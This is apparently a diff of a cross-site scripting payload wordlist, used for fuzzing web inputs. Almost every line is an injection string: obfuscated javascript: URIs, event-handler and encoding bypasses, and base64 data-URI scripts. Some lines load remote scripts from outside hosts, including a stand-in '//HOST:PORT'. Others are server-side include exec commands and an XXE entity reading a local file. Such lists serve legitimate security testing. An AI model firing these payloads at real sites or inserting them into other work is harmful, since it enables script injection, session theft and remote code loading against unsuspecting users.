+b=\"URL(\\"\";
+<;!--#exec cmd=";/bin/echo ';<;SCRIPT SRC';";-->;<;!--#exec cmd=";/bin/echo ';=http://ha.ckers.org/xss.js>;<;/SCRIPT>;';";-->;
+<iframe
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
+&lt;A HREF=&quot;//google&quot;&gt;XSS&lt;/A&gt;
+<bgsound SRC="javascript:document.vulnerable=true;">
+<h1><font color=blue>hellox worldss</h1>
+&LT
 <Video> <source onerror = "javascript: alert (XSS)">
-&#000060
+&#X03C;
+&lt;IMG&#x0D;SRC&#x0D;=&#x0D;&quot;&#x0D;j&#x0D;a&#x0D;v&#x0D;a&#x0D;s&#x0D;c&#x0D;r&#x0D;i&#x0D;p&#x0D;t&#x0D;:&#x0D;a&#x0D;l&#x0D;e&#x0D;r&#x0D;t&#x0D;(&#x0D;&apos;&#x0D;X&#x0D;S&#x0D;S&#x0D;&apos;&#x0D;)&#x0D;&quot;&#x0D;&gt;&#x0D;
+<meta HTTP-EQUIV="refresh" CONTENT="0;url=javascript:document.vulnerable=true;">
+<;SCRIPT a=";>;"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
+<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
+&#x3C
+<br><x id=x>#x
 %C0%BCscript%C0%A0src%C0%BD%C0%82mymethod%C0%A8%C0%A9%C0%82%C0%A0%C0%AF%C0%BE
-&#x27E8;script&#x27E9;
-</body>
-<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
-%253Csvg%2520o%256Eload%253Dalert%25281%2529%253E
-<iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
+<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
+<iframe/src \/\/onload = prompt(1)
+"alt=
+top[/al/.source+/ert/.source](1)
+<object allowscriptaccess="always" data="test.swf"></object>
+<svg/onload=%26%23097lert%26lpar;1337)>
+"'%253e%253cscript%253econfirm(42)%253c/script%253e
+<div style="background:url(http://foo.f/f oo/;color:red/*/foo.jpg);">X</div>
+"onmouseover
+&lt;A HREF=\"http&#58;//0102&#46;0146&#46;0007&#46;00000223/\"&gt;XSS&lt;/A&gt;
+<iframe width="420" height="315" src="https://www.youtube.com/embed/5LlQNty_C8s?autoplay=1" frameborder="0" allowfullscreen></iframe>
+1111111
+&lt;?xml&#58;namespace prefix=\"t\" ns=\"urn&#58;schemas-microsoft-com&#58;time\"&gt;
+<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
+<svg onload="import('data:text/javascript,al'+''+'ert(0)')">
+<body style="background-color:red">
+%2522%2527%253e%253cscript%253econfirm(42)%253c/script%253e
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><feImage><set attributeName="xlink:href" to="data:image/svg+xml;charset=utf-8;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D"/></feImage></svg>
+<x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="test.evt#x"/>
+<style TYPE="text/javascript">document.vulnerable=true;</style>
+prompt(
+<div style="binding: url(http://www.securitycompass.com/xss.js);"> [Mozilla]
+<x:script xmlns:x="http://www.w3.org/1999/xhtml" src="//brutelogic.com.br/1.js"/>
+XXXXXXX
+<meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi
+<input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!>
+<svg xmlns="http://www.w3.org/2000/svg"><path d="M0,0" style="marker-start:url(test4.svg#a)"/></svg>
+exp/*<;XSS STYLE=';no\xss:noxss(";*//*";);
+<svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>
+<HTML xmlns:xss><?import namespace="xss" implementation="http://www.securitycompass.com/xss.htc"><xss:xss>XSS</xss:xss></html>
+"'%u003e%u003cscript%u003econfirm(42)%u003c/script%u003e
+<<scr\0ipt/src=http://xss.com/xss.js></script
+<iframe onload=print()></iframe>
+&#X003c
+%25u0022%25u0027%25u003e%25u003cscript%25u003econfirm(42)%25u003c/script%25u003e
+&lt;A HREF=\"//www&#46;google&#46;com/\"&gt;XSS&lt;/A&gt;
+<style>@im\port'\ja\vasc\ript:document.vulnerable=true';</style>
+&lt;/C&gt;&lt;/X&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
+<LAYER SRC="http://ha.ckers.org/scriptlet.html"></LAYER>
+<embed src="data:text/html;base64,%(base64)s">
+<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
+<img src="livescript:document.vulnerable=true;">
+&lt;EMBED SRC=&quot;http://ha.ckers.org/xss.swf&quot; AllowScriptAccess=&quot;always&quot;&gt;&lt;/EMBED&gt;
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+http://www.simpatie.ro/index.php?page=top_movies&cat=13&p=2 p=2 ??XSS??
+&#x00003c
+onload=
+href="data:text/html;charset=utf-7;base64,K0FEdy1zY3JpcHQrQUQ0LWNvbmZpcm0oNDIpK0FEc0FQQS0vc2NyaXB0K0FENC0="	UTF-7 in base64
+&#X003c;
+&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;http://ha.ckers.org/xss.css&quot;&gt;
+<input type=text autofocus onfocus=window[490837..toString(1<<5)](atob('YWxlcnQoMSk='))//
+";a=prompt,a()//
+<layer
+&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data&#58;text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\"&gt;
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+&lt;A HREF=&quot;http://www.gohttp://www.google.com/ogle.com/&quot;&gt;XSS&lt;/A&gt;
+<a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
+&lt;IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041&gt;
+&#X0003C
+<;A HREF=";h&#x0A;tt&#09;p://6&;#09;6.000146.0x7.147/";>;XSS<;/A>;
+<svg </onload ="1> (_=alert,_(1)) "">
 <style>@import'http://www.securitycompass.com/xss.css';</style>
-'-confirm`1`-'
-&lt;? echo('&lt;SCR)';
-&lt;HTML&gt;&lt;BODY&gt;
-<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
-top['al\x65rt'](1)
-<style
-src=
-&lt;SCRIPT/XSS SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
-&lt;A HREF=&quot;http://google.com/&quot;&gt;XSS&lt;/A&gt;
-<img src="http://38.media.tumblr.com/tumblr_ls64yimLuz1r0ix14o1_400.gif"></img>
-<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>
-<x onxxx%3D1
-<A HREF="htt	p://6	6.000146.0x7.147/">XSS</A>
-<X onxxx=1
-<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&
-<img SRC="jav ascript:document.vulnerable=true;">
+"'><sc\ript>confirm(42)</script>
+\");
+<x 1="1"onxxx=1
+<iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
+"'%25253e%25253cscript%25253econfirm(42)%25253c/script%25253e
+<IMG SRC="mocha:[code]">
+"onload=
+alert;pg("XSS")
+<base HREF="javascript:document.vulnerable=true;//">
+<h1>INJECTX</h1>
+&lt;A HREF=&quot;//www.google.com/&quot;&gt;XSS&lt;/A&gt;
+href="data:                                          text/html;charset=utf-7;base64,K0FEdy1zY3JpcHQrQUQ0LWNvbmZpcm0oNDIpK0FEc0FQQS0vc2NyaXB0K0FENC0=">obfuscated UTF-7 in base64
+&#x000003c
+INJECTX
+<;XML SRC=";http://ha.ckers.org/xsstest.xml"; ID=I>;<;/XML>;
+<div style="x:expression((window.r==1)?'':eval('r=1;
+<;A HREF=";http://0x42.0x0000066.0x7.0x93/";>;XSS<;/A>;
+<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
+<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
+&#x000003C
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///dev/random">]><foo>&xee;</foo>
+"-eval("window['pro'%2B'mpt'](8)")-"
+<svg onload=(alert)(1) >//INJECTX
+href="data:text/html;base64,PHNjcmlwdD5jb25maXJtKDQyKTs8L3NjcmlwdD4="	base64
+<deTAiLs/open/oNtoGGle=confirm()>
+&lt;OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\"&gt;&lt;/OBJECT&gt;
+&lt;? echo(&apos;&lt;SCR)&apos;;
+<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
+<details onauxclick=confirm`xss`></details>
+<;STYLE>;@import';http://ha.ckers.org/xss.css';;<;/STYLE>;
+><h1><IFRAME width="420" height="315" frameborder="0" onmouseover="document.location.href='https://www.youtube.com/channel/UC9Qa_gXarSmObPX3ooIQZr
+javascript:confirm(42)
+&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
+<form><a href="javascript:\u0061lert(1)">X
+<iframe src="http://sn1persecurity.com/.testing/xss_vuln.html"></iframe>//INJECTX
+&lt;!--#exec cmd=\"/bin/echo '&lt;SCR'\"--&gt;&lt;!--#exec cmd=\"/bin/echo 'IPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;'\"--&gt;
+%3C
+&lt;iframe src=http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html&gt;
+&#000060
+&#X003C
+'-prompt(8)-'
+"onclick=
+<bleh/onclick=top[/al/.source+/ert/.source]&Tab;``>click
+<link rel="import" href="test.svg" />
+"-top['al\x65rt']('sailay')-"
+"style=
+<iframe src="view-source:http://www.example.org/" frameborder="0" style="width:400px;height:180px"></iframe><textarea type="text" cols="50" rows="10"></textarea>
+<D3/OnMouSEenTer=[2].find(confirm)>z
+<;SCRIPT a=`>;` SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
+XXX<style>*{color:gre/**/en !/**/important}*{color:red}*{background:url(xx:x //**/\red/*)}</style>
+')>
+<IFRAME SRC="javascript:document.vulnerable=true;"></iframe>
+&#x00003C
+<br><br><br><br><br><br><x id=x>#x
+<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:document.vulnerable=true"></B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></span>
+&#060
+alert&#40;1&#41
+<body onload=prompt(123) >
+&lt;SCRIPT&gt;a=/XSS/
+<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>
+<LAYER SRC="%(scriptlet)s"></LAYER>
+<meta/content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxMzM3KTwvc2NyaXB0Pg=="http-equiv=refresh>
+<img src="http://31.media.tumblr.com/ae3ef754917fe39e9c1fec441c553c85/tumblr_nsa8jqTm7i1resp2ko1_500.gif"></img>
+<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
+c=\"javascript&#058;\";
+<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
+jAvas	Cript:confirm(42)
+&lt;DIV STYLE=\"background-image&#58;\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028&#46;1027\0058&#46;1053\0053\0027\0029'\0029\"&gt;
+<object onbeforescriptexecute=confirm(0)>
+<img dynsrc="javascript:document.vulnerable=true;">
